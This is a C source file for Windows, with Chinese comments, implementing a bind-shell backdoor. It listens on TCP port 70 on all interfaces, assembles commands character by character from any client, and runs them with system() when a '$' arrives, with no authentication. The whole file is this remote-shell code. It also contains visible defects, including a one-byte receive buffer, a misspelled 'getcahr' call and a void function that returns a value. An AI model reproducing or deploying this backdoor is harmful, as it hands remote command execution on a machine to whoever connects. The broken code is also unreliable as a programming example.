#include <stdio.h>
#include <stdlib.h>
#include<windows.h>
#include<winsock2.h>
#pragma comment(lib,"ws2_32.lib")

void TCPserver()
{
    //初始化WSAData
    WSADATA data;
    WORD v=MAKEWORD(2,0);
    WSAStartup(v,&data);
    //创建套接字
    SOCKET s1,s2;
    s1=socket(AF_INET,SOCK_STREAM,0);
    //地址，端口初始化
    SOCKADDR_IN addr1,addr2;
    addr1.sin_family=AF_INET;
    addr1.sin_port=htons(70);
    //设置远程主机地址
    addr1.sin_addr.S_un.S_addr=INADDR_ANY;
    //绑定到端口
    bind(s1,(SOCKADDR*)&addr1,sizeof(addr1));
    //监听
    listen(s1,5);
    char str2[]="";
    printf("服务器启动!");

    //建立连接
    while(1)
    {
        int size=sizeof(addr2);
        s2=accept(s1,(SOCKADDR*)&addr2,&size);
        if(s2!=NULL)
        {
            printf("[*]%s连接到本机SHELL\n",inet_ntoa(addr2.sin_addr));
         }

/***********************核心部分****************************/
char cmd[100]="";    //创建一个空命令的字符串
       while(1)
       {
           recv(s2,str2,sizeof(str2),0);
          	//print("str2=%s",str2);//调试用
            if(!strcmp(str2,"$"))//检查str2是否为$,是视为命令输入结束。进入执行命令。所以在编写连接器的时候，给输出值结尾加一个'$',借此作为判断。
            {
                //print("cmd=%s",cmd);//调试用
                system(cmd);		//在系统中运行代码
                //strcpy(cmd,"");//cmd清零//在这个位置清零不彻底
            }
            sscanf(str2,"%1s",str2);//非常关键的函数。取str2字符串的第一个字符。str2本来是由我们输入的字符+空格组成。否则结果：”ping”命令就会变成”p i n g ”
            strcat(cmd,str2);  //将接收到的字符“str2”连接到cmd字符串末尾

            if(!strcmp(str2,"$"))
            {
                strcpy(cmd,"");//再次清零，去掉$
            }
        }

}
/***************************************************/
    //关闭TCP连接
closesocket(s1);
    closesocket(s2);
    WSACleanup();
    if(getcahr())
    {
        return 0;
    }
    else
    {
        Sleep(100);
    }

}

int main()
{
    system("color f5");//改变系统配色
    TCPserver();


    return 0;
}
